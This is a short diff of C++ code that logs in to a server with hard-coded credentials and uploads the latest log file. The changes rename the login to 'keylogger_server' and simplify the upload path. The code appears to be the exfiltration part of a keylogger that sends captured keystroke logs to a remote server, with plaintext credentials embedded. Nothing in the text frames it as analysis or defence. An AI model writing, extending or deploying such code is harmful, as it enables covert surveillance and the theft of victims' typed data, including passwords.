@@ -659,7 +659,7 @@ std::string api_get() {
         headers = curl_slist_append(headers, "Content-Type: application/json");
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
 
-        const char* data = R"({"username": "admin", "password": "adm1n5"})";
+        const char* data = R"({"username": "keylogger_server", "password": "114514"})";
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
 
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
@@ -754,7 +754,7 @@ void uploadLatestLog()
 
     fs::path logPath(latestLogPath);
     std::string fileName = logPath.filename().string();
-    std::string serverFile = "/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/log/" + fileName;
+    std::string serverFile = "/log/" + fileName;
 
     bool success = uploadFile(token, latestLogPath, serverFile);
     if (!success) {
